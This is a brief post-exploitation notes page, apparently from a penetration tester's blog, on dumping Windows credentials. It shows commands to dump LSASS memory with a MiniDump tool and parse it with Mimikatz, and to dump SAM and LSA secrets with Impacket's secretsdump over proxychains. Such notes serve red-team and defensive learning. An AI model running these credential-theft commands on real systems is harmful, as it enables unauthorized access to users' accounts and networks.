---
date: 2020-04-09 23:00:00 +0000
title: Credential Dumping
description: Notes on dumping LSASS and LSA secrets
categories: PostExploitation

---
### Dumping LSASS process

If it possible to execute  a csharp assembly to dump out the LSASS process in order to obtain credential information. For instance using the "MiniDump" tool from "Mr-Un1k0d3r" here - [https://github.com/Mr-Un1k0d3r/MiniDump](https://github.com/Mr-Un1k0d3r/MiniDump "https://github.com/Mr-Un1k0d3r/MiniDump")

    execute-assembly minidump.exe /pid:id

Make sure that the command is ran from a folder where the user has write access. Once the memory dump file is downloaded, Mimikatz can be used offline to parse the dump for passwords:

    sekurlsa::minidump lsass.dmp

    sekurlsa::logonPasswords

### Dumping LSA Secrets Registry Hive

Assuming the host has a Socks server running on it, it is possible to leverage proxychains and use Impacket's secretdump tool to dump the SAM and LSA secrets hive:

    proxychains secretdump.py domain/username:password@ip